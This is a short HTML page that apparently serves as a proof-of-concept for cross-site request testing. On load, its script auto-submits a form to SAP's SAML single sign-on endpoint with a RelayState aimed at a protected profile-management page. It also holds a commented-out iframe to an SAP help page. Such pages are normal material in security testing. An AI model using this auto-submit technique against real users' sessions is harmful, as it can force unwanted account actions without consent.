

<!DOCTYPE html>
<html>
<head>
  <title>Auto POST Request with Payload</title>
</head>
<body>
<!-- <iframe src="https://help.sap.com/webassistant/context?id=32497794" width="500" height="500"></iframe> -->
  
  <script>
    window.onload = function() {
     
      const form = document.createElement("form");
      form.method = "GET";
      form.action = "https://accounts.sap.com/saml2/idp/sso?sp=sp.accounts.sap.com&RelayState=https://accounts.sap.com/ui/protected/profilemanagement";

      document.body.appendChild(form);
      form.submit();
    };
  </script>
</body>
</html>
